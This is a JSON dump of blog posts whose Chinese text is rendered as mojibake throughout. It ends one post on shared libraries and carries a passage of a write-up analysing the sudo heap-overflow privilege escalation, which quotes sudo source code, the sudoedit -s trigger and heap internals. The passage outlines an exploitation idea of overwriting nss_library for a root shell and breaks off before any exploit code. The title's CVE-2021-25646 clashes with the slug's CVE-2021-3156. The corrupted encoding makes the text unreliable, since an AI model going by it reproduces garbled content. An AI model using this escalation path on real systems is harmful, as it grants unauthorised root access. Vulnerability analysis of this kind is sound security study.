Libraryï¼‰ï¼ˆåœ°å€å›ºå®šï¼‰ åŠ¨æ€å…±äº«åº“ï¼ˆDynamic Shared Libaryï¼‰ï¼ˆåœ°å€ä¸å›ºå®šï¼‰ é™æ€å…±äº«åº“ é™æ€å…±äº«åº“çš„åšæ³•æ˜¯å°†ç¨‹åºçš„å„ä¸ªæ¨¡å—ç»Ÿä¸€äº¤ç»™æ“ä½œç³»ç»Ÿè¿›è¡Œç®¡ç†ï¼Œæ“ä½œç³»ç»Ÿåœ¨æŸä¸ªç‰¹å®šçš„åœ°å€åˆ’åˆ†å‡ºä¸€äº›åœ°å€å—ï¼Œä¸ºé‚£äº›å·²çŸ¥çš„æ¨¡å—é¢„ç•™è¶³å¤Ÿçš„ç©ºé—´ã€‚å› ä¸ºè¿™ä¸ªåœ°å€å¯¹äºä¸åŒçš„åº”ç”¨ç¨‹åºæ¥è¯´ï¼Œéƒ½æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥ç§°ä¹‹ä¸ºé™æ€ã€‚ ä½†æ˜¯é™æ€å…±äº«åº“çš„ç›®æ ‡åœ°å€ä¼šå¯¼è‡´åœ°å€å†²çªã€å‡çº§ç­‰é—®é¢˜ã€‚ åŠ¨æ€å…±äº«åº“ é‡‡ç”¨åŠ¨æ€å…±äº«åº“çš„æ–¹å¼ï¼Œä¹Ÿç§°ä¸ºè£…è½½æ—¶é‡å®šä½ï¼ˆLoad Time Relocationï¼‰ã€‚å…¶åŸºæœ¬æ€è·¯æ˜¯ï¼šåœ¨é“¾æ¥æ—¶ï¼Œå¯¹æ‰€æœ‰ç»å¯¹åœ°å€çš„å¼•ç”¨éƒ½ä¸ä½œé‡å®šä½ï¼Œè€ŒæŠŠè¿™ä¸€æ­¥æ¨è¿Ÿåˆ°è£…è½½æ—¶å†å®Œæˆã€‚ä¸€æ—¦æ¨¡å—è£…è½½åœ°å€ç¡®å®šï¼Œå³ç›®æ ‡åœ°å€ç¡®å®šï¼Œé‚£ä¹ˆç³»ç»Ÿå°±å¯¹ç¨‹åºä¸­æ‰€æœ‰çš„ç»å¯¹åœ°å€å¼•ç”¨è¿›è¡Œé‡å®šä½ã€‚ ä½†æ˜¯è¿™ç§æ–¹å¼ä¹Ÿå­˜åœ¨ä¸€äº›é—®é¢˜ã€‚æ¯”å¦‚ï¼ŒåŠ¨æ€é“¾æ¥æ¨¡å—è¢«è£…è½½æ˜ å°„è‡³è™šæ‹Ÿç©ºé—´åï¼ŒæŒ‡ä»¤éƒ¨åˆ†æ˜¯åœ¨å¤šä¸ªè¿›ç¨‹é—´å…±äº«çš„ï¼Œç”±äºè£…è½½æ—¶é‡å®šä½çš„æ–¹æ³•éœ€è¦ä¿®æ”¹æŒ‡ä»¤ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•åšåˆ°åŒä¸€ä»½æŒ‡ä»¤è¢«å¤šä¸ªè¿›ç¨‹å…±äº«ï¼Œå› ä¸ºæŒ‡ä»¤è¢«é‡å®šä½åå¯¹äºæ¯ä¸ªè¿›ç¨‹æ¥è¯´éƒ½æ˜¯ä¸åŒçš„ã€‚ ç„¶åï¼ŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ä»£ç æ˜¯å…±äº«çš„ï¼Œä½†æ˜¯å…¶ä¸­çš„å¯ä¿®æ”¹æ•°æ®éƒ¨åˆ†å¯¹äºä¸åŒè¿›ç¨‹æ¥è¯´æ˜¯ç”±å¤šä¸ªå‰¯æœ¬çš„ã€‚åŸºäºæ­¤ï¼Œä¸€ç§åä¸ºåœ°å€æ— å…³ä»£ç çš„æŠ€æœ¯è¢«æå‡ºä»¥å…‹æœè¿™ä¸ªé—®é¢˜ã€‚ ä¸åœ°å€æ— å…³ æ— è®ºä½•ç§æ“ä½œç³»ç»Ÿä¸Šï¼Œä½¿ç”¨åŠ¨æ€é“¾æ¥ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ä¸­å‡¡æ˜¯æ¶‰åŠç¬¬ä¸‰æ–¹åº“çš„å‡½æ•°è°ƒç”¨éƒ½æ˜¯åœ°å€æ— å…³çš„ã€‚æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„ç¨‹åºåä¸ºhello.cï¼Œhello.cä¸­è°ƒç”¨äº†Cæ ‡å‡†åº“çš„printf()ï¼Œåœ¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œä¸ä¼šç«‹å³ç¡®å®šprintf()çš„å…·ä½“åœ°å€ï¼Œè€Œæ˜¯åœ¨è¿è¡Œæ—¶å»è£…è½½è¿™ä¸ªå‡½æ•°ï¼Œåœ¨è£…è½½é˜¶æ®µç¡®å®šprintf()çš„åœ°å€ã€‚è¿™é‡Œæåˆ°çš„åœ°å€æŒ‡çš„æ˜¯è¿›ç¨‹åœ¨å†…å­˜ä¸Šçš„è™šæ‹Ÿåœ°å€ã€‚åŠ¨æ€é“¾æ¥åº“çš„å‡½æ•°åœ°å€åœ¨ç¼–è¯‘æ—¶æ˜¯ä¸ç¡®å®šçš„ï¼Œåœ¨è£…è½½æ—¶ï¼Œè£…è½½å™¨æ ¹æ®å½“å‰åœ°å€ç©ºé—´æƒ…å†µï¼ŒåŠ¨æ€åœ°åˆ†é…ä¸€å—è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚ å°ç»“åœ¨ä¼šå†™ä¸€ä¸ªCç¨‹åºï¼Œä¹Ÿè¦äº†è§£ä¸€ä¸ªCä»£ç æ˜¯å¦‚ä½•ä»ASCIIæ–‡ä»¶ä¸€æ­¥æ­¥å˜ä¸ºå¯æ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹ã€‚","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"ç¼–è¯‘è¿‡ç¨‹","slug":"ç¼–è¯‘è¿‡ç¨‹","permalink":"http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"},{"name":"é“¾æ¥","slug":"é“¾æ¥","permalink":"http://example.com/tags/%E9%93%BE%E6%8E%A5/"}]},{"title":"CVE-2021-25646å †æº¢å‡ºæ¼æ´å¤ç°åŠåˆ†æ","slug":"CVE-2021-3156","date":"2021-04-10T03:26:10.677Z","updated":"2021-04-10T06:32:38.500Z","comments":true,"path":"2021/04/10/CVE-2021-3156/","link":"","permalink":"http://example.com/2021/04/10/CVE-2021-3156/","excerpt":"","text":"CVE-2021-25646å †æº¢å‡ºæ¼æ´å¤ç°åŠåˆ†ææ¼æ´è¯¦æƒ…â€‹ å½“åœ¨ç±»Unixçš„æ“ä½œç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤æ—¶ï¼Œérootç”¨æˆ·å¯ä»¥ä½¿ç”¨sudoå‘½ä»¤æ¥ä»¥rootç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚ç”±äºsudoé”™è¯¯åœ°åœ¨å‚æ•°ä¸­è½¬ä¹‰äº†åæ–œæ å¯¼è‡´å †ç¼“å†²åŒºæº¢å‡ºï¼Œä»è€Œå…è®¸ä»»ä½•æœ¬åœ°ç”¨æˆ·ï¼ˆæ— è®ºæ˜¯å¦åœ¨sudoersæ–‡ä»¶ä¸­ï¼‰è·å¾—rootæƒé™ï¼Œæ— éœ€è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä¸”æ”»å‡»è€…ä¸éœ€è¦çŸ¥é“ç”¨æˆ·å¯†ç ã€‚ â€‹ å½±å“èŒƒå›´ï¼š â€‹ Sudo 1.8.2 - 1.8.31p2 â€‹ Sudo 1.9.0 - 1.9.5p1 æ¼æ´åŸç†åˆ†æâ€‹ å¯¹äºbashè€Œè¨€å‡å¦‚æˆ‘ä»¬å¸Œæœ›æ‰§è¡ŒæŸä¸ªå‘½ä»¤å¯ä»¥ä½¿ç”¨bash -c [command]æ¥æ‰§è¡Œï¼Œå¦‚æœæˆ‘ä»¬å¸Œæœ›ä»¥rootçš„æƒé™å»æ‰§è¡ŒæŸä¸ªå‘½ä»¤çš„è¯å¯ä»¥ç›´æ¥sudo [cmd]ï¼Œè€Œå¦‚æœæˆ‘ä»¬å¸Œæœ›ä»¥shellæ¨¡å¼å»æ‰§è¡ŒæŸä¸ªå‘½ä»¤çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨sudo -iæˆ–è€…sudo -så‚æ•°ï¼Œåœ¨å‚æ•°è¯´æ˜é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°-i, --login run login shell as the target user; a command may also be specifiedï¼Œ -s, --shell run shell as the target user; a command may also be specifiedï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ä¸Šè¿°å‚æ•°æ—¶å¯¹äºsudoçš„flagsè€Œè¨€æœ‰ä¸¤ç§æƒ…å†µï¼š ä½¿ç”¨sudo -sï¼Œè®¾ç½®MO DE_SHELL ä½¿ç”¨sudo -iï¼Œè®¾ç½®MODE_SHELL|MODE_LOGIN_SHELL â€‹ åœ¨src/parse_args.cé‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹äºè¿™ç§æ¨¡å¼çš„å‚æ•°å¤„ç†ï¼Œå¤„ç†æ–¹å¼ä¸ºå°†å‚æ•°æŒ‰ç…§ç©ºæ ¼æ‹¼æ¥èµ·æ¥ï¼Œå¯¹äºä¸€äº›å…ƒå­—ç¬¦ä½¿ç”¨åæ–œçº¿è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œæœ€ç»ˆè¦†å†™äº†argvä¸ºacè¿™ä¸ªæŒ‡é’ˆæ•°ç»„ã€‚ â€‹ æºç åˆ†æï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* * For shell mode we need to rewrite argv */ if (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; char **av, *cmnd = NULL; int ac = 1; if (argc != 0) &#123; /* shell -c &quot;command&quot; */ char *src, *dst; //å¾—åˆ°å‘½ä»¤çš„é•¿åº¦ size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) + strlen(argv[argc - 1]) + 1; cmnd = dst = reallocarray(NULL, cmnd_size, 2); if (cmnd == NULL) sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); if (!gc_add(GC_PTR, cmnd)) exit(1); //æ‹¼æ¥å‘½ä»¤å¹¶ä¸”å¤„ç†è½¬ç§»ç¬¦ for (av = argv; *av != NULL; av++) &#123; for (src = *av; *src != &#x27;\\0&#x27;; src++) &#123; /* quote potential meta characters */ if (!isalnum((unsigned char)*src) &amp;&amp; *src != &#x27;_&#x27; &amp;&amp; *src != &#x27;-&#x27; &amp;&amp; *src != &#x27;$&#x27;) *dst++ = &#x27;\\\\&#x27;;//å¤„ç†è½¬ä¹‰å­—ç¬¦ï¼Œ&#x27;\\\\&#x27;è¡¨ç¤ºåæ–œçº¿ *dst++ = *src; &#125; *dst++ = &#x27; &#x27;; &#125; if (cmnd != dst) dst--; /* replace last space with a NUL */ *dst = &#x27;\\0&#x27;; ac += 2; /* -c cmnd */ &#125; //ä¸Šè¿°å¤„ç†å®Œæ¯•åç»“æœä¿å­˜åœ¨dstæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ av = reallocarray(NULL, ac + 1, sizeof(char *)); //åˆ†é…æ–°çš„å†…å­˜ä¿å­˜æ‹¼æ¥çš„å‘½ä»¤ if (av == NULL) sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); if (!gc_add(GC_PTR, av)) exit(1); av[0] = (char *)user_details.shell; /* plugin may override shell */ if (cmnd != NULL) &#123; av[1] = &quot;-c&quot;; av[2] = cmnd; &#125; av[ac] = NULL; //æœ€åçš„å½¢å¼ä¸º shell -c cmnd(shellå’Œç¯å¢ƒå˜é‡ç›¸å…³ï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œæ˜¯zshï¼Œshellä¸º/usr/bin/zsh) //æœ€ç»ˆç”¨avè¦†å†™argv argv = av; argc = ac; &#125; â€‹ éšååœ¨sudoers.cä¸­çš„sudoers_policy_mainå‡½æ•°ä¸­è°ƒç”¨set_cmndå°†å‘½ä»¤è¡Œå‚æ•°å­˜æ”¾åœ¨ä¸€ä¸ªå †ä¸Šçš„æ•°æ®ç»“æ„user_argsä¸­ï¼Œè¿™é‡Œä¹Ÿå¯¹å…ƒå­—ç¬¦åšäº†å¤„ç†ï¼Œå‡å¦‚ä¸æ˜¯\\\\+spaceçš„å½¢å¼å°±è·³è¿‡å…ƒå­—ç¬¦ï¼Œå¦åˆ™æ‹·è´åˆ°*toã€‚é‚£ä¹ˆå‡å¦‚æˆ‘ä»¬çš„å‘½ä»¤è¡Œå‚æ•°ä»¥\\\\ç»“å°¾ï¼Œé‚£ä¹ˆfrom[0]=&#39;\\\\&#39;;from[1]=NULL(æ³¨æ„NULLå¹¶ésapceèŒƒå›´)ï¼Œæ­¤æ—¶from++æŒ‡å‘ç©ºå­—ç¬¦ï¼Œä¸‹é¢å°†ç©ºå­—ç¬¦æ‹·è´åˆ°äº†*toå¹¶ä¸”from++åæ‰§è¡Œäº†NULLåé¢çš„å­—ç¬¦ï¼Œæ­¤æ—¶å†æ¬¡è¿›è¡Œwhileå¾ªç¯åˆ¤æ–­æ—¶å¾ˆæ˜æ˜¾è¿™é‡Œæ˜¯å¯ä»¥ç»§ç»­è¿›å…¥å¾ªç¯çš„(å¦‚æœåä¸€ä¸ªå­—ç¬¦ä¸ä¸ºNULL)ï¼Œä»è€Œèµ‹å€¼å¾—ä»¥ç»§ç»­è¿›è¡Œï¼Œä»è€Œäº§ç”Ÿäº†æº¢å‡ºã€‚ 1234567891011121314151617if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; /* * When running a command via a shell, the sudo front-end * escapes potential meta chars. We unescape non-spaces * for sudoers matching and logging purposes. */ for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; set_cmnd()å­˜åœ¨è¶Šç•Œå†™ï¼Œæº¢å‡ºuser_argså †ç¼“å†²åŒºï¼ˆsizeæ˜¯åœ¨852-853è¡Œä¸­è®¡ç®—ï¼‰ã€‚æ ¹æœ¬åŸå› å°±æ˜¯ï¼Œsudoé»˜è®¤ \\ åé¢è‚¯å®šè·Ÿç€å…ƒå­—ç¬¦ï¼Œå®é™…ä¸Šåé¢åªæœ‰1ä¸ªç»“æŸç¬¦ã€‚ å½“fromæŒ‡å‘\\æ—¶ï¼Œfrom[1]æŒ‡å‘NULLå­—èŠ‚ï¼Œfrom[2]æŒ‡å‘çš„å°±æ˜¯ç¯å¢ƒå˜é‡çš„ç¬¬ä¸€ä¸ªå­—èŠ‚äº†ï¼Œæ‰§è¡Œ*too=*from++ï¼Œå¯ä»¥å°†åé¢çš„NULLå­—èŠ‚æ‹·è´åˆ°user_argsçš„å †ä¸­ï¼Œä¸”è®©from++ï¼Œä»è€Œé¿å¼€äº†while(*fromï¼‰åˆ¤æ–­æ˜¯å¦è¯»åˆ°NULLå­—èŠ‚çš„æ£€æµ‹ï¼Œç”±äºå‚æ•°åé¢ç´§è·Ÿç¯å¢ƒå˜é‡çš„å€¼ï¼Œå› æ­¤é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡çš„å€¼æ¥è¦†ç›–user_argså †åé¢çš„æ•°æ®ã€‚ â€‹ ä¸Šè¿°æ˜¯æˆ‘ä»¬çš„ç†è®ºåˆ†æï¼Œåœ¨ç†è®ºè§’åº¦ä¸Šçœ‹æ¼æ´æ˜¯å­˜åœ¨çš„ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨ä¹‹å‰çš„æ¼æ´ä¸­ä¹Ÿè§åˆ°è¿‡ç”±äºæ— æ³•åˆ›é€ æ¼æ´åˆ©ç”¨åœºæ™¯(æ¯”å¦‚æˆ‘æƒ³ææƒä½†æ˜¯expé‡Œéœ€è¦æŸä¸ªrootç”¨æˆ·ç»™çš„capability)ï¼Œè¿™æ ·çš„æ´å°±éå¸¸é¸¡è‚‹ã€‚é‚£ä¹ˆåœ¨æˆ‘ä»¬çš„åˆ†æé‡Œæœ‰å‡ ä¸ªç†æƒ³æ¡ä»¶ï¼Œé‚£ä¹ˆæœ€åçš„è¿™ä¸ªåœºæ™¯ï¼Œå³åæ–œçº¿ä½œä¸ºcmd-lineçš„æœ€åä¸€ä¸ªå­—ç¬¦ä»ç†è®ºä¸Šæ¥è¯´æ˜¯æ— æ³•å®ç°çš„ï¼Œè¿™é‡Œè¦æ±‚æˆ‘ä»¬æœ‰MODE_SHELL|MODE_LOGIN_SHELLï¼Œè€Œå‡å¦‚flagåŒ…å«MODE_SHELLçš„è¯åœ¨æˆ‘ä»¬ä¹‹å‰çš„parse_argså‚æ•°è§£æä¸­å°±ä¼šå°†æ‰€æœ‰å…ƒå­—ç¬¦ç»™è½¬ä¹‰æ‰ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šæœ‰ä¸¤ä¸ªåæ–œçº¿ï¼Œæˆ‘ä»¬å†æŒ‰ç…§ä»£ç èµ°ä¸€éä¼šå‘ç°è¿™æ ·å¾ªç¯æœ«å°¾çš„*from=NULLï¼Œå› æ­¤ä¼šè·³å‡ºå¾ªç¯ã€‚ â€‹ å†ä»”ç»†å¯¹æ¯”ä¸€ä¸‹äºŒè€…çš„æ¡ä»¶ï¼ŒäºŒè€…çš„æ¡ä»¶ç•¥æœ‰ä¸åŒã€‚æˆ‘ä»¬çš„é—®é¢˜åœ¨äºèƒ½å¦è®¾ç½®flagä¸ºMODE_SHELLä»¥åŠMODE_RUNæˆ–è€…MODE_EDITæˆ–è€…MODE_CHECKã€‚ â€‹ å†çœ‹ä¸‹è§£æå‚æ•°çš„éƒ¨åˆ†ä¼šå‘ç°å¥½åƒè¿˜æ˜¯ä¸å¤ªè¡Œï¼Œå‡å¦‚æˆ‘ä»¬ä½¿ç”¨-eå‚æ•°è®¾ç½®MODE_EDITæˆ–è€…ä½¿ç”¨-lå‚æ•°è®¾ç½®MODE_CHECKï¼Œæˆ‘ä»¬çš„MODE_SHELLå‚æ•°å°±ä¼šè¢«ä»valid_flagså»æ‰ã€‚ 12345678910//bug conditionif (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; //... if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; &#125;&#125;//escape meta char conditionif (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; //.. &#125; 1234567891011121314151617181920212223242526#define MODE_NONINTERACTIVE 0x00800000#define MODE_SHELL 0x00020000//parse_args.ccase &#x27;e&#x27;: if (mode &amp;&amp; mode != MODE_EDIT) usage_excl(1); mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; valid_flags = MODE_NONINTERACTIVE;//è¿™é‡Œ break; //...case &#x27;l&#x27;: if (mode) &#123; if (mode == MODE_LIST) SET(flags, MODE_LONG_LIST); else usage_excl(1); &#125; mode = MODE_LIST; valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;//è¿™é‡Œ //...if ((flags &amp; valid_flags) != flags) usage(1); â€‹ æœ€åä½œè€…å‘ç°äº†ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„åœ°æ–¹(ç›²çŒœæ˜¯é€šè¿‡å…¨å±€æœflagæ‰¾åˆ°çš„)ï¼Œé‚£å°±æ˜¯å¦‚æœæˆ‘ä»¬å»æ‰§è¡Œsudoeditï¼Œparse_argså‡½æ•°ä¼šè‡ªåŠ¨è®¾ç½®MODE_EDITï¼Œå¹¶ä¸”ä¸ä¼šé‡ç½®valid_flagsï¼Œè€Œvalid_flagsé»˜è®¤åŒ…å«äº†MODE_SHELLã€‚ 123456789101112131415/* * Default flags allowed when running a command. */#define DEFAULT_VALID_FLAGS (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)int valid_flags = DEFAULT_VALID_FLAGS; /* First, check to see if we were invoked as &quot;sudoedit&quot;. */ proglen = strlen(progname); if (proglen &gt; 4 &amp;&amp; strcmp(progname + proglen - 4, &quot;edit&quot;) == 0) &#123; progname = &quot;sudoedit&quot;; mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; &#125; â€‹ ä¹Ÿå°±æ˜¯è¯´ï¼ŒåŠ å…¥æˆ‘ä»¬æ‰§è¡Œsudoedit -sï¼Œå°±åŒæ—¶å…¼å…·äº†MODE_SHELL|MODE_EDITè€Œæ²¡æœ‰MODE_RUNï¼Œå› æ­¤å¯ä»¥æˆåŠŸåˆ°è¾¾æ¼æ´ç‚¹ã€‚ ä¸€ä¸ªæº¢å‡ºdemoï¼š 1.å †æº¢å‡ºåˆ†æ1.å †åœ¨å†…å­˜ä¸­çš„ä½ç½® 2.å †çš„ç»“æ„ arenaï¼šé€šè¿‡sbrkæˆ–mmapç³»ç»Ÿè°ƒç”¨ä¸ºçº¿ç¨‹åˆ†é…çš„å †åŒºï¼ŒæŒ‰çº¿ç¨‹çš„ç±»å‹å¯ä»¥åˆ†ä¸º2ç±»ï¼š main arenaï¼šä¸»çº¿ç¨‹å»ºç«‹çš„arenaï¼› thread arenaï¼šå­çº¿ç¨‹å»ºç«‹çš„arenaï¼› binï¼šä¸€ä¸ªç”¨ä»¥ä¿å­˜Free chunké“¾è¡¨çš„è¡¨å¤´ä¿¡æ¯çš„æŒ‡é’ˆæ•°ç»„ï¼ŒæŒ‰æ‰€æ‚¬æŒ‚é“¾è¡¨çš„ç±»å‹å¯ä»¥åˆ†ä¸º4ç±»: Fast binï¼šFast bin å…±æœ‰10ä¸ªï¼Œå­˜å‚¨äº†chunk size ä»16åˆ°80çš„free chunkï¼Œè¿™äº›free chunkè¢«ç§°ä½œfast chunk Unsorted binï¼šå½“é‡Šæ”¾è¾ƒå°æˆ–è¾ƒå¤§çš„chunkçš„æ—¶å€™ï¼Œå¦‚æœç³»ç»Ÿæ²¡æœ‰å°†å®ƒä»¬æ·»åŠ åˆ°å¯¹åº”çš„binsä¸­ï¼Œç³»ç»Ÿå°±å°†è¿™äº›chunkæ·»åŠ åˆ°unsorted binä¸­ã€‚ Small binï¼šå°äº512å­—èŠ‚çš„chunkç§°ä¹‹ä¸ºsmall chunkï¼Œsmall binå°±æ˜¯ç”¨äºç®¡ç†small chunkçš„ã€‚ Large binï¼šå¤§äº512å­—èŠ‚çš„chunkç§°ä¹‹ä¸ºlarge chunkï¼Œlarge binå°±æ˜¯ç”¨äºç®¡ç†è¿™äº›large chunkçš„ã€‚ PS:libc2.26 ä¹‹åçš„ Tcache æœºåˆ¶ Tcache bin :ç±»ä¼¼äºfastbinä¸€æ ·çš„ä¸œè¥¿ï¼Œæ¯æ¡é“¾ä¸Šæœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª chunkï¼Œfreeçš„æ—¶å€™å½“tcacheæ»¡äº†æ‰æ”¾å…¥fastbinï¼Œunsorted binï¼Œmallocçš„æ—¶å€™ä¼˜å…ˆå»tcacheæ‰¾ã€‚ åŒºåˆ«ï¼šMax fast bins size is 0x80. Max tcache bins size is 0x410 mutexï¼šäº’æ–¥é”ï¼Œé˜²æ­¢å¤šçº¿ç¨‹å¯¹chunkèµ„æºçš„ç«äº‰ Large binï¼š chunkï¼šé€»è¾‘ä¸Šåˆ’åˆ†çš„ä¸€å°å—å†…å­˜ï¼Œæ ¹æ®ä½œç”¨ä¸åŒåˆ†ä¸º4ç±»ï¼š Allocated chunkï¼šå³åˆ†é…ç»™ç”¨æˆ·ä¸”æœªé‡Šæ”¾çš„å†…å­˜å—ï¼› Free chunkï¼šå³ç”¨æˆ·å·²ç»é‡Šæ”¾çš„å†…å­˜å—ï¼› Top chunkï¼šå¤„äºä¸€ä¸ªarenaçš„æœ€é¡¶éƒ¨çš„chunk Last Remainder chunkï¼šå¯¹small binçš„mallocæœºåˆ¶çš„ä»‹ç»ä¸­å½“ç”¨æˆ·è¯·æ±‚çš„æ˜¯ä¸€ä¸ªsmall chunkï¼Œä¸”è¯¥è¯·æ±‚æ— æ³•è¢«small binã€unsorted binæ»¡è¶³çš„æ—¶å€™ï¼Œå°±é€šè¿‡binmapséå†binæŸ¥æ‰¾æœ€åˆé€‚çš„chunkï¼Œå¦‚æœè¯¥chunkæœ‰å‰©ä½™éƒ¨åˆ†çš„è¯ï¼Œå°±å°†è¯¥å‰©ä½™éƒ¨åˆ†å˜æˆä¸€ä¸ªæ–°çš„chunkåŠ å…¥åˆ°unsorted binä¸­ï¼Œå¦å¤–ï¼Œå†å°†è¯¥æ–°çš„chunkå˜æˆæ–°çš„last remainder chunkã€‚ æ ‡å¿—ä½ï¼š A:è®°å½•å½“å‰chunkæ˜¯å¦å±äºä¸»çº¿ç¨‹ M:è®°å½•å½“å‰chunkæ˜¯å¦æ˜¯ç”±mmapåˆ†é… P:è®°å½•å‰ä¸€ä¸ªchunkå—æ˜¯å¦è¢«åˆ†é… Malloc Algorithmï¼š 1.è‹¥mallocè¯·æ±‚å¤§å°ä¸tcacheä¸­æŸä¸ªchunkå¤§å°å®Œå…¨åŒ¹é…ï¼Œä¼˜å…ˆä»tcache binsè°ƒç”¨è€Œä¸å¿…å‘large binå‘å‡ºè¯·æ±‚ã€‚ 2.è‹¥è¯·æ±‚å†…å­˜è¶³å¤Ÿå¤§ï¼Œåˆ™è°ƒç”¨mmap()ç›´æ¥å‘æ“ä½œç³»ç»Ÿä»å†…å­˜ä¸­è°ƒç”¨ 3.è‹¥fast binä¸­æœ‰åˆé€‚å¤§å°çš„å—ï¼Œåˆ™å…ˆä»ä¸­åˆ†é… TO be continuedâ€¦. Free Algorithmï¼š 1.è‹¥tcache binsæœ‰ç©ºé—´ï¼Œåˆ™ä¼˜å…ˆå°†ç©ºé—²å—æ”¾å…¥å…¶ä¸­ 2.å¦‚æœå—è¶³å¤Ÿå°ï¼Œåˆ™ä¼˜å…ˆæ”¾å…¥fast binsä¸­ TO be continuedâ€¦. ä»è¯¥è°ƒåº¦ç®—æ³•å¯ä»¥çœ‹å‡ºï¼ŒæŸä¸ªå…·ä½“å¤§å°çš„chunkå¯ä»¥åœ¨tcache bins ä¸­ç¨³å®šå­˜åœ¨ä¸€å®šæ—¶é—´å¹¶ä¸”ä¸å‘ç”Ÿåˆå¹¶ï¼Œè¿™ä¸ªæœºåˆ¶å¯ä»¥ä¸ºæˆ‘ä»¬ç²¾å‡†æº¢å‡ºåˆ°æŸä¸ªç»“æ„ä½“å‰é¢é™„è¿‘æå‰è¿›è¡Œå ä½ã€‚ æ¼æ´åˆ©ç”¨æ€è·¯ï¼šåˆ©ç”¨æº¢å‡ºè¦†å†™nss_libraryä¸ºX/Xï¼Œä»è€ŒåŠ è½½è‡ªå®šä¹‰çš„åº“å‡½æ•°ï¼Œè¿›è€Œget root shellã€‚ çŸ¥è¯†èƒŒæ™¯ï¼š 1.glibc setlocalemain()å‡½æ•°è¾ƒæ—©è°ƒç”¨äº†setlocale()å‡½æ•°ï¼ŒæŸ¥é˜…æºç æˆ‘ä»¬å‘ç°æ­¤å¤„è¿›è¡Œäº†mallocæ“ä½œï¼Œè¿™æ ·å¯ä»¥åˆ†é…å¹¶é‡Šæ”¾å‡ ä¸ªLCç¯å¢ƒå˜é‡ï¼ˆLC_CTYPEï¼ŒLC_MESSAGESï¼ŒLC_TIMEç­‰ï¼‰ï¼Œè¿™æ ·å°±åœ¨Sudoçš„å †å¼€å¤´å¤„ç•™ä¸‹äº†ç©ºé—²çš„fast/tcache chunks 12345678// /src/sudo.c150: int main(int argc, char *argv[], char *envp[])151: &#123; ...171: setlocale(LC_ALL, &quot;&quot;); ...216: sudo_mode = parse_args(argc, argv, &amp;submit_optind, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add); æ€»ä¹‹æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡å¯¹å †è¿›è¡Œä¿®é¥°ï¼Œå¾—åˆ°æŒ‡å®šå¤§å°çš„ç©ºé—²chunk å¹¶ä¸”è¯¥å—åœ¨NSSç»“æ„ä½“ä¹‹å‰ã€‚ç”±mallocæœºåˆ¶ä¸éš¾åˆ†æå‡ºï¼Œæˆ‘ä»¬æ§åˆ¶å¥½æº¢å‡ºå¤§å°å¾ˆå®¹æ˜“åœ¨tcacheæˆ–è€…fast binsä¸­å æœ‰è¯¥ç©ºé—²å—ã€‚ 2.NSSï¼ˆName Service Switchï¼‰â€‹ æ¯ä¸ªLinux/Unixçš„æ“ä½œç³»ç»Ÿä¸­éƒ½æœ‰è¿™æ 